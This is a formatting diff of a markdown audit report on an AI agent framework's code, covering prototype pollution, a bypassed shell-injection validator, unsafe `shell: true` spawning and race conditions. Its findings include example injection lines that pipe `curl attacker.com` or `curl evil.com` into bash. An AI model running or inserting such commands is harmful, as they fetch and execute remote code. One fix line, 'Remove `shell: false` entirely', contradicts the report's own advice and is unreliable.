@@ -17,25 +17,25 @@
 
 ### Issue Distribution
 
-| Severity | Count | Risk Level |
-|----------|-------|-----------|
-| CRITICAL | 5     | BLOCKING - must fix immediately |
-| HIGH     | 18    | Urgent - fix before next release |
-| MEDIUM   | 13    | Should fix - schedule for sprint |
-| LOW      | 9     | Nice to have - backlog |
-| **Total**| **45**| -- |
+| Severity  | Count  | Risk Level                       |
+| --------- | ------ | -------------------------------- |
+| CRITICAL  | 5      | BLOCKING - must fix immediately  |
+| HIGH      | 18     | Urgent - fix before next release |
+| MEDIUM    | 13     | Should fix - schedule for sprint |
+| LOW       | 9      | Nice to have - backlog           |
+| **Total** | **45** | --                               |
 
 ---
 
 ## Rubric Scores (Quality Assessment)
 
-| Dimension         | Score | Analysis |
-|-------------------|-------|----------|
-| **Completeness**  | 0.85  | Audit is thorough and systematic, covers code structures comprehensively |
-| **Accuracy**      | 0.90  | Findings are well-documented with file paths, line numbers, and evidence |
-| **Clarity**       | 0.75  | Report is clear but dense; some security details require domain knowledge |
+| Dimension         | Score | Analysis                                                                                                   |
+| ----------------- | ----- | ---------------------------------------------------------------------------------------------------------- |
+| **Completeness**  | 0.85  | Audit is thorough and systematic, covers code structures comprehensively                                   |
+| **Accuracy**      | 0.90  | Findings are well-documented with file paths, line numbers, and evidence                                   |
+| **Clarity**       | 0.75  | Report is clear but dense; some security details require domain knowledge                                  |
 | **Consistency**   | 0.60  | Inconsistent enforcement of security patterns (safeParseJSON used in some files, raw JSON.parse in others) |
-| **Actionability** | 0.50  | Report identifies problems but lacks effort estimates and prioritization breakdown |
+| **Actionability** | 0.50  | Report identifies problems but lacks effort estimates and prioritization breakdown                         |
 
 **Overall Score: 0.72 / 1.0** (PASS with concerns)
 
@@ -76,20 +76,24 @@
 **Problem**: Raw `JSON.parse()` in memory subsystem lacks prototype pollution defense
 
 **Evidence**:
+
 - File count: 7 files with multiple instances
 - Locations: memory-manager.cjs (11), memory-tiers.cjs (3), memory-scheduler.cjs (3), contextual-memory.cjs (4), memory-dashboard.cjs (3), gotchas.json parser, patterns.json parser
 - Attack vector: Memory files could be injected with malicious JSON containing `__proto__`, `constructor`, `prototype` keys
 
 **Why this matters**:
+
 - Prototype pollution can escalate privileges globally across the application
 - Memory files are trusted internal sources, but if compromised (or if user-controlled data is written to memory), exploitation is trivial
 
 **Root cause**:
+
 - `safe-json.cjs` utility exists but isn't consistently used across memory subsystem
 - No enforcement mechanism to require safeParseJSON over raw JSON.parse
 - Developers may not be aware of the vulnerability
 
 **Recommended fix**:
+
 1. Audit all 7 files and replace `JSON.parse(x)` with `safeParseJSON(x, fallback)`
 2. Add ESLint rule to block raw JSON.parse in specific directories (.claude/lib/memory/)
 3. Document why memory subsystem requires safe parsing (internal files = trusted, but defense in depth)
@@ -101,21 +105,25 @@
 **Problem**: Hooks register validators but validators export functions instead of CLI entrypoints. Subprocess spawning them exits 0 (success) without validating anything.
 
 **Evidence**:
+
 - `bash-pretool-bundle.cjs` line 11: spawns `shell-injection-validator.cjs` as subprocess
 - `shell-injection-validator.cjs`: exports only `handler()` function, no `if (require.main === module) { main() }` entrypoint
 - Result: Subprocess exits immediately with code 0, bypassing all shell injection checks
 
 **Why this is CRITICAL**:
+
 - Shell injection validator is designed to block dangerous Bash commands (e.g., `eval`, `rm -rf`, piped commands)
 - Validator bypass means any Bash command is allowed, including `spawn_cmd | curl attacker.com | bash`
 - Affects all Bash tool usage in framework
 
 **Root cause**:
+
 - Hook system design expects handlers to be functions (used inline) OR standalone scripts (spawnSync'd)
 - Mixing both patterns without clear documentation leads to silent failures
 - No validation that spawned hooks actually read stdin and exit 2 on failure
 
 **Recommended fix**:
+
 1. Add `require.main === module` entrypoint to all hook validators used via spawnSync
 2. Create hook validator template that enforces stdin reading + exit code contract
 3. Add pre-commit hook to validate all registered hooks have proper entrypoints
@@ -128,24 +136,29 @@
 **Problem**: Three cloud CLI skills (AWS, GCloud, Kubernetes) pass user-controlled arguments to spawn() with `shell: true`
 
 **Evidence**:
+
 - `aws-cloud-ops/scripts/main.cjs:60-67` — `spawn('aws', args, { shell: true })`
 - `gcloud-cli/scripts/main.cjs:60-67` — `spawn('gcloud', args, { shell: true })`
 - `kubernetes-flux/scripts/main.cjs:60-67` — `spawn('kubectl', args, { shell: true })`
 
 **Attack scenario**:
+
 - User calls skill with args = `['s3', 'ls', '; curl evil.com | bash']`
 - shell: true interprets semicolon as command separator
 - Arbitrary code executes
 
 **Root cause**:
+
 - Perceived need for shell expansion (globbing, variable expansion)
 - Not understanding that Node.js array arguments bypass shell parsing entirely
 
 **Recommended fix**:
+
 - Remove `shell: false` entirely. Replace with array-based argument passing.
 - If shell features needed, pre-process in Node.js (globbing via glob module, etc.)
 
 **Broader pattern**:
+
 - Code standards document correctly states "use shell: false with array arguments" but three skill scripts violate it
 - Suggests education/enforcement gap in code review process
 
@@ -156,22 +169,26 @@
 **Problem**: Multiple modules attempt atomic writes to shared state files without proper locking
 
 **Evidence**:
+
 - `memory-scheduler.cjs`: Concurrent reads/writes to `.claude/context/memory/` files without file-based locking
 - `workflow-state-manager.cjs`: Updates to `.claude/context/runtime/workflow-state.json` without atomic operations
 - `agent-registry-auto-refresh.cjs`: Modifies agent registry with possible concurrent writes from multiple hook invocations
 
 **Failure scenario**:
+
 - Task N and Task N+1 both start in parallel
 - Both read state file: `{ phase: 'Design' }`
 - Both advance phase: Task N writes `{ phase: 'Implement' }`, Task N+1 writes `{ phase: 'Implement' }` (same state)
 - Second write may partially overwrite first; state corrupted
 
 **Root cause**:
+
 - No exclusive write locking mechanism (e.g., `proper-lockfile` module)
 - Assumption that JSON writes are atomic (they're not; can be partial on crash)
 - No versioning/checksum validation to detect corruption
 
 **Recommended fix**:
+
 - Use `proper-lockfile` for all shared state files
 - Add pre-write validation: read existing state, add checksum, write atomically
 - Document concurrency model for state manager
@@ -183,15 +200,18 @@
 **Problem**: `code-index-updater.cjs` exists but is no longer invoked or referenced anywhere
 
 **Evidence**:
+
 - No references in hooks/workflows/scripts to `code-index-updater.cjs`
 - Appears to be legacy from previous indexing system before hybrid lazy search
 - Takes up ~200 LOC of maintenance burden
 
 **Root cause**:
+
 - Code-index-updater was replaced by hybrid lazy search system but module wasn't archived
 - No cleanup of unreferenced modules after refactoring
 
 **Recommended fix**:
+
 - Move to `.claude/tools/_archive/code-index-updater.cjs` with changelog entry
 - Document: "Replaced by hybrid lazy search; legacy module archived 2026-02-17"
 
@@ -202,15 +222,18 @@
 **Problem**: Regex patterns and path validation code assume forward slashes. On Windows, paths use backslashes.
 
 **Evidence**:
+
 - BM25 indexer glob-to-regex conversion doesn't normalize Windows backslash paths
 - Validation patterns like `[^/]*` won't block backslash characters on Windows
 - Relative path handling: `path.relative()` returns backslashes on Windows
 
 **Root cause**:
+
 - Code written on Unix-like systems; Windows-specific behavior not tested
 - Path normalization should be systematic but scattered across modules
 
 **Recommended fix**:
+
 - Create `normalizePath(p)` utility that converts backslashes to forward slashes
 - Use consistently before regex matching or glob conversion
 - Add Windows-specific test cases for path handling
@@ -224,6 +247,7 @@
 **Observation**: Security patterns (safe-json, safe-spawn, proper-locking) are documented but not enforced. Results: inconsistent usage, repeated vulnerabilities.
 
 **Recommendation**:
+
 - ESLint rules block raw JSON.parse in memory/ directory
 - Pre-commit hook validates all spawn() calls use `shell: false` with array args
 - Linter warns on concurrent file access without proper-lockfile
@@ -233,6 +257,7 @@
 **Observation**: Hook system supports two patterns (inline functions vs CLI scripts) but mixing them silently fails.
 
 **Recommendation**:
+
 - Create hook-validator template enforcing stdin + exit 2 on failure
 - Document: "Validators registered in spawnSync array MUST have if (require.main === module) entrypoint"
 - Pre-submit check: validates all registered hooks have proper entrypoints
@@ -242,6 +267,7 @@
 **Observation**: Replaced modules aren't archived, creating maintenance burden and confusion.
 
 **Recommendation**:
+
 - Post-refactoring checklist: archive old modules
 - Annual audit: identify unreferenced code and archive it
 - Document archival reason in archive-metadata.json
@@ -281,7 +307,7 @@
 ### P1 (HIGH - Next Sprint)
 
 1. **[6 hours]** Add proper-lockfile to concurrent state managers (memory-scheduler, workflow-state-manager, agent-registry-auto-refresh)
-2. **[4 hours]** Archive code-index-updater.cjs to _archive/
+2. **[4 hours]** Archive code-index-updater.cjs to \_archive/
 3. **[4 hours]** Create Windows path normalization utility and audit 12 files that use paths
 4. **Total: 14 hours**
 
@@ -316,4 +342,3 @@ The codebase quality audit identified 45 issues spanning security, reliability, 
 
 **Reflection Score: 0.72 / 1.0 (PASS)**
 **Status: Actionable findings → prioritized remediation roadmap extracted**
-
